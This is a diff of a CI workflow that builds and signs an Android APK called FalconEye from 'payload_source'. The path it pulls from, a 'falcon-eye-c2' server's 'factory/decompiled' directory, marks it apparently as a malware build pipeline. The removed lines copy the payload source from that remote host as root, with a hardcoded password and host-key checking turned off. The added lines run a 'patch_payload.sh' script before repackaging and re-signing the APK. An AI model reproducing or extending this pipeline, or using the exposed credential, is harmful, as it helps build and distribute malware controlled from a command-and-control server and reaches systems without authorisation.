@@ -20,20 +20,19 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y wget unzip sshpass
+          sudo apt-get install -y wget unzip
           wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O apktool.jar
           wget https://github.com/patrickfav/uber-adb-tools/releases/download/v1.3.1/uber-apk-signer-1.3.0.jar -O sign.jar
 
-      - name: Download source from VPS
-        run: |
-          mkdir -p payload_source
-          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no -r root@77.105.133.37:/opt/falcon-eye-c2/server/app/factory/decompiled/* ./payload_source/
+      - name: Patch Payload
+        run: ./patch_payload.sh
 
       - name: Build APK
         run: |
           java -jar apktool.jar b ./payload_source -o unsigned.apk
           java -jar sign.jar -a unsigned.apk --allowResign
           mkdir -p app/build/outputs/apk/debug/
+          # uber-apk-signer names output as <name>-aligned-debugSigned.apk
           mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk
 
       - name: Upload APK
